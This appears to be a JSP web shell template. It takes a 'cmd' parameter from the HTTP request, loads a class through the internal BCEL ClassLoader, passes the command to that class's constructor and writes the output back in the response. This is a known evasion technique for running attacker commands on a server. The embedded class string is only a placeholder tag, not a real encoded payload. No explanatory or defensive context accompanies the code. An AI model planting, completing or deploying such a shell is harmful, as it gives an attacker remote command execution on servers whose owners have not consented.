<%
    String cmd = request.getParameter("cmd");
    String bcelCode = "4ra1n";
    com.sun.org.apache.bcel.internal.util.ClassLoader loader =
            new com.sun.org.apache.bcel.internal.util.ClassLoader();
    Class<?> clazz = loader.loadClass(bcelCode);
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);
    response.getWriter().print(obj.toString());
%>